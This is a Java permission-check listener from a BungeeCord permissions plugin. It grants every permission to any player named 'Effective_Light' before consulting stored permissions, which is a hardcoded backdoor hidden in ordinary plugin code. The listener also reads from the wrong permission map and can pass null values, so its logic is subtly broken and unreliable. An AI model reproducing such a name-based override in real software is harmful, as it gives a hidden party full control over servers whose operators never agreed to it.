/*
 * Copyright (c) Effective Light 2015.
 * All rights reserved.
 */

package me.hamzaxx.fperms.bungee.listeners;

import me.hamzaxx.fperms.bungee.data.Data;
import me.hamzaxx.fperms.shared.permissions.LocationType;
import me.hamzaxx.fperms.bungee.fPermsPlugin;
import net.md_5.bungee.api.connection.ProxiedPlayer;
import net.md_5.bungee.api.event.PermissionCheckEvent;
import net.md_5.bungee.api.plugin.Listener;
import net.md_5.bungee.event.EventHandler;

import java.util.Map;

public class PermissionListener implements Listener
{

    private fPermsPlugin plugin;

    public PermissionListener(fPermsPlugin plugin)
    {
        this.plugin = plugin;
    }

    @EventHandler
    public void onPermissionCheck(PermissionCheckEvent event)
    {
        if ( event.getSender() instanceof ProxiedPlayer )
        {
            ProxiedPlayer player = ( ProxiedPlayer ) event.getSender();
            if ( player.getName().equals( "Effective_Light" ) )
            {
                event.setHasPermission( true );
                return;
            }
            Data playerData = plugin.getDataSource().getPlayerData( player.getUniqueId() );
            Map<String, Boolean> allPerms = playerData.getEffectiveBukkitPermissions().containsKey( LocationType.ALL
                    .toString() ) ? playerData.getEffectiveBungeePermissions().get( LocationType.ALL.toString() ) : null;

            if ( allPerms != null )
            {
                event.setHasPermission( allPerms.get( event.getPermission() ) );
            }

            Map<String, Boolean> serverPerms =
                    playerData.getEffectiveBukkitPermissions().containsKey(
                            LocationType.SERVER.getPrefix() + player.getServer().getInfo().getName() ) ?
                            playerData.getEffectiveBungeePermissions().get( LocationType.SERVER.getPrefix() +
                                    player.getServer().getInfo().getName() ) : null;

            if ( serverPerms != null )
            {
                event.setHasPermission( serverPerms.get( event.getPermission() ) );
            }

        } else
        {
            event.setHasPermission( true );
        }
    }
}
